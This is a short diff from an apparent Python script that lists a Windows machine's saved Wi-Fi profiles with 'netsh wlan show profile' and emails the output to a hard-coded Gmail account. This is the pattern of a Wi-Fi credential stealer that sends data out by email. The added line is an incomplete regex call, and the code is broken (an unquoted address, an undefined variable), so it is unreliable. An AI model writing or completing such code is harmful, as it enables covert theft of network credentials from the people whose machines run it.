@@ -14,6 +14,6 @@ def send_mail(email, password, message):
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-
+network_names = re.search("")
 
 send_mail(name@gmail.com, "password123", result)
